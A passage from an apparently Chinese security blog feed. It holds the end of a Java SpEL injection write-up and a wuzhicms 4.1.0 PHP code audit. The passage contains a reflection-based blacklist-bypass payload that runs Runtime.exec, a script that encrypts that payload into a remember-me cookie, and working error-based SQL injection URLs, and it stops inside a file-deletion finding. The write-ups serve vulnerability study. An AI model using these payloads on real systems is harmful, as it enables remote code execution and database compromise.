class="hljs-comment">/*     */</span>     <br><span class="hljs-comment">/*  43 */</span>     <span class="hljs-type">Object</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-comment">/*  44 */</span>     <span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span> || username.toString().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br><span class="hljs-comment">/*  45 */</span>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/login&quot;</span>;<br><span class="hljs-comment">/*     */</span>     &#125;<br><span class="hljs-comment">/*     */</span>     <br><span class="hljs-comment">/*  48 */</span>     model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>, getAdvanceValue(username.toString()));<br><span class="hljs-comment">/*  49 */</span>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-comment">/*     */</span>   &#125;<br></code></pre></td></tr></table></figure><p>因此，我们只需输入admin&#x2F;admin并勾选remember-me选项,点击登录，然后在请求包中修改Cookie内容即可。</p><p>先构造payload</p><p>由于黑名单的限制，这里利用java反射机制调用所需类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRu&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><p>分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. <span class="hljs-string">&#x27;&#x27;</span>.getClass() → java.lang.String.class<br>   <span class="hljs-string">&#x27;&#x27;</span> 是空字符串，调用 .getClass() 获取 java.lang.String.class 对象（即 Class&lt;String&gt;）<br>2. forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>) → Runtime.class<br>   反射方式加载 java.lang.Runtime 类。<br>   等价于：Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>3. .getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>.getClass()) → 获取 <span class="hljs-built_in">exec</span> 方法<br>   .getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>   表示获取 Runtime 实例的 <span class="hljs-built_in">exec</span>(String) 方法。<br>4. .getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(null) → 获取 Runtime 实例<br>   通过调用静态方法 Runtime.getRuntime() 得到一个运行时实例:<br>   Runtime runtime=Runtime.getRuntime();<br>   这里的反射方式：.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(null)<br>5. .invoke(..., <span class="hljs-string">&quot;calc&quot;</span>) → 执行命令<br>   runtime.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>   <br>最终等价于 Java 代码：Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>再将其加密，加密代码在Encryptor.java文件中</p><p><img src="/img/spel/s03.png"></p><p>已知key是c0dehack1nghere1，initVector是0123456789abcdef，value是要加密的值</p><p>写一个加密脚本</p><p>先将value设置为admin，加密后与数据包中remember-me的值比较</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        String key=<span class="hljs-string">&quot;c0dehack1nghere1&quot;</span>;<br>        String initVector=<span class="hljs-string">&quot;0123456789abcdef&quot;</span>;<br>        String value=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-comment">/*    */</span>     <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">/* 15 */</span>       <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(initVector.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-comment">/* 16 */</span>       <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(key.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>), <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 18 */</span>       <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);<br>        <span class="hljs-comment">/* 19 */</span>       cipher.init(<span class="hljs-number">1</span>, skeySpec, iv);<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 21 */</span>       <span class="hljs-type">byte</span>[] encrypted = cipher.doFinal(value.getBytes());<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 23 */</span>       System.out.println(Base64.getUrlEncoder().encodeToString(encrypted));<br>        <span class="hljs-comment">/* 24 */</span>     &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        <span class="hljs-comment">/* 28 */</span>       System.out.println(ex.getMessage());<br>        <span class="hljs-comment">/*    */</span>     &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到加密结果与数据包中值是相同的，说明脚本没有问题</p><p><img src="/img/spel/s04.png"></p><p><img src="/img/spel/s05.png"></p><p>将脚本中value值更改为payload</p><p>运行后抓取数据包，将remember-me的值改为加密后结果</p><p>发送数据包，成功弹出计算器</p><p><img src="/img/spel/s06.png"></p><h4 id="通过SpEL注入内存马"><a href="#通过SpEL注入内存马" class="headerlink" title="通过SpEL注入内存马"></a>通过SpEL注入内存马</h4><p><a href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/A_art_xiang/article/details/134370029">Spring-SpEL表达式超级详细使用全解-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/8744">SpEL注入RCE分析与绕过-先知社区 (aliyun.com)</a></p><p><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a></p><p><a href="https://www.cnblogs.com/qiushuo/p/18393442">https://www.cnblogs.com/qiushuo/p/18393442</a></p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms-4.1.0 代码审计(php)</title>
    <link href="/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在www&#x2F;configs&#x2F;default_mysql_config.php更改对应配置信息</p><p><img src="/img/wuzhicms/w01.png"></p><p>新建一个名为wuzhicms的数据库</p><p>按照安装说明，访问域名：<a href="http://域名/install/">http:&#x2F;&#x2F;域名&#x2F;install&#x2F;</a> 进行安装</p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><h4 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h4><h5 id="判断路由关系"><a href="#判断路由关系" class="headerlink" title="判断路由关系"></a>判断路由关系</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=index&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p>在coreframe&#x2F;app文件夹中，m表示对应的模块，f表示对应的类，v表示类中的方法</p><h5 id="传值方法"><a href="#传值方法" class="headerlink" title="传值方法"></a>传值方法</h5><p>此源码传值是利用GLOBALS</p><p><img src="/img/wuzhicms/w10.png"></p><h5 id="引用数据库模板插件等-查看安装说明"><a href="#引用数据库模板插件等-查看安装说明" class="headerlink" title="引用数据库模板插件等(查看安装说明)"></a>引用数据库模板插件等(查看安装说明)</h5><p>查看cms说明可以了解到数据库是mysql</p><p>翻看目录结构可以看到有templet文件夹，可以关注是否有ssti注入</p><p>在说明中看到</p><p><img src="/img/wuzhicms/w02.png"></p><p>源码中禁止附件目录运行php，说明大概率是爆出过文件上传漏洞，一会可以尝试 .htaccess文件配合图片马上传</p><h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><p><code>admin/</code> — 后台控制器或配置</p><p><code>fields/</code> — 字段类型定义与处理器</p><p><code>libs/</code> — 核心类库和工具函数</p><h5 id="自动化工具使用"><a href="#自动化工具使用" class="headerlink" title="自动化工具使用"></a>自动化工具使用</h5><p>不好用，只能辅助</p><p>先用自动化工具扫描一下</p><p><img src="/img/wuzhicms/w03.png"></p><p>控制类主要在coreframe&#x2F;app目录中，着重关注</p><h5 id="搜索敏感函数关键字"><a href="#搜索敏感函数关键字" class="headerlink" title="搜索敏感函数关键字"></a>搜索敏感函数关键字</h5><p><a href="https://www.cnblogs.com/murkuo/p/15660517.html">php敏感函数速查表 - MuRKuo - 博客园 (cnblogs.com)</a></p><h4 id="后台phpinfo-敏感信息泄露"><a href="#后台phpinfo-敏感信息泄露" class="headerlink" title="后台phpinfo()敏感信息泄露"></a>后台phpinfo()敏感信息泄露</h4><p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php</p><p><img src="/img/wuzhicms/w04.png"></p><p>直接访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=index&amp;v=phpinfo&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w05.png"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>全局搜索select时发现coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;mysql.class.php中</p><p>get_list与get_one方法有未过滤的sql语句</p><p><img src="/img/wuzhicms/w11.png"></p><p>全局搜素是否有调用这两个函数的方法，并且传入参数可控</p><p>查看是否能访问</p><h5 id="后台注入01"><a href="#后台注入01" class="headerlink" title="后台注入01"></a>后台注入01</h5><p>类似的listing方法有很多，不一一列出</p><p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;copyfrom.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listing</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;copyfrom&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>);<br><span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>        <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;copyfrom_listing&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到keywords参数可控</p><p>构造url尝试访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p>能看到是友链操作列表查询</p><p>测试一下</p><p><img src="/img/wuzhicms/w12.png"></p><p>看到单引号报错，使用报错注入</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost/wuzhicms/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=1%25%27+or+1%3dextractvalue(1%2cconcat(0x7e%2c(<span class="hljs-keyword">select</span>+database())))+%23<br></code></pre></td></tr></table></figure><p>顺利注入</p><p><img src="/img/wuzhicms/w13.png"></p><h5 id="后台注入02"><a href="#后台注入02" class="headerlink" title="后台注入02"></a>后台注入02</h5><p>coreframe&#x2F;app&#x2F;promote&#x2F;admin&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>       <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>       <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>       <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>           <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>           <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>           <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>           <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>           <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>           <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>       &#125;<br></code></pre></td></tr></table></figure><p>这个直接全局搜索是不显示的，全局搜索时可以看到只显示到coreframe&#x2F;app&#x2F;pay目录，剩下的需要手动查找</p><p>直接搜索url，发现有报错提示</p><p><img src="/img/wuzhicms/w14.png"></p><p>同样使用报错注入</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost/wuzhicms/www/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=1%25%27+or+1%3dextractvalue(1%2cconcat(0x7e%2c(<span class="hljs-keyword">select</span>+database())))+%23<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w15.png"></p><h4 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h4><p>搜索unlink关键字</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><p>del()方法对用户传入的url参数无过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span 